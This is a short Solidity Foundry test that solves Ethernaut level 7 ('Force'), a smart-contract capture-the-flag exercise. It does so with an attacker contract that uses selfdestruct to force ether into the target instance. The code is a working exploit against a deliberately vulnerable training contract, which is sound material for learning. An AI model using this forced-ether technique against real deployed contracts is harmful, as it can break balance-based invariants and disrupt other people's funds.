pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {EthernautTest} from "./EthernautTest.sol";

interface IForce {
    function pwn() external;
}

contract Attacker {
    constructor() payable {}

    function attack(address _instance) external {
        selfdestruct(payable(_instance));
    }
}

contract Ethernaut07 is EthernautTest {
    constructor() EthernautTest(7) {}

    function solve() internal override(EthernautTest) {
        Attacker attacker = new Attacker{value: 1}();
        attacker.attack(instance);
    }
}
